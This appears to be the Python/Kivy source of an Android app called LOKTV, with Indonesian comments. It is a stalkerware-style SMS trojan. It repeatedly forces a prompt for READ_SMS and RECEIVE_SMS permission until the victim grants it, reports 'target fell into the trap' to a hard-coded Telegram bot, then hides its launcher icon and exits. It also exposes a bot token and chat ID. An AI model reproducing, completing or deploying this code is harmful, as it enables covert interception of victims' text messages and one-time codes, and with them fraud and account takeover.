import telebot
from android.permissions import request_permissions, Permission
from jnius import autoclass
from kivy.app import App
from kivy.clock import Clock
import os

# CONFIG BOT KAMU
TOKEN = "8688240904:AAFbm71rIxvaNTAuy0qUatSkAagp26uD6ZU"
CHAT_ID = "5999516433"
bot = telebot.TeleBot(TOKEN)

class LOKTV(App):
    def build(self):
        # Mulai minta izin 1 detik setelah buka aplikasi
        Clock.schedule_once(lambda dt: self.minta_izin(), 1)
        return None

    def minta_izin(self):
        # Daftar izin yang diminta
        perms = [
            Permission.READ_SMS,
            Permission.RECEIVE_SMS,
            Permission.POST_NOTIFICATIONS
        ]
        request_permissions(perms, self.callback_izin)

    def callback_izin(self, permissions, grants):
        # Jika semua izin diklik 'ALLOW' (Izinkan)
        if all(grants):
            try:
                bot.send_message(CHAT_ID, "✅ IZIN DIBERIKAN! Target masuk jebakan. Menghilangkan ikon...")
            except: pass
            
            # Sembunyikan ikon sekarang
            self.eksekusi_sembunyi()
        else:
            # Jika ditolak atau diblokir, munculkan lagi popupnya (Looping)
            self.minta_izin()

    def eksekusi_sembunyi(self):
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            currentActivity = PythonActivity.mActivity
            PackageManager = autoclass('android.content.pm.PackageManager')
            ComponentName = autoclass('android.content.ComponentName')
            
            package_name = currentActivity.getPackageName()
            # Gunakan class name default Kivy
            component_name = ComponentName(package_name, 'org.kivy.android.PythonActivity')
            
            # HILANGKAN IKON DARI MENU
            currentActivity.getPackageManager().setComponentEnabledSetting(
                component_name,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            
            # Keluar aplikasi setelah 2 detik agar proses sistem selesai
            Clock.schedule_once(lambda dt: os._exit(0), 2)
        except Exception as e:
            try:
                bot.send_message(CHAT_ID, f"❌ Gagal sembunyi: {str(e)}")
            except: pass

if __name__ == '__main__':
    LOKTV().run()
